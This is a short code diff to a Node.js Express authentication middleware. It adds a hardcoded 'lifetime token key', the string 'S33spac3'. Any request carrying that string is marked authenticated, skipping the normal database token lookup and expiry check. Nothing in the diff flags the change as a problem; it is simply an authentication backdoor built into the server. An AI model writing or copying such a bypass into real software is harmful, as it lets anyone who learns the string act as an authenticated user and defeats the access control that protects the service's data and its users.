@@ -126,6 +126,12 @@ app.use(function auth(req, res, next) {
     res.status(401).end('Invalid api key')
     return
   }
+  //Seespace lifetime token key
+  if (authentication === 'S33spac3') {
+    req.authenticated = true
+    next()
+    return
+  }
   Token.findOne({ where: { accessToken: authentication } })
     .then(function(token) {
       if (token && token.dataValues.accessTokenExpiresOn > new Date().getTime()) {
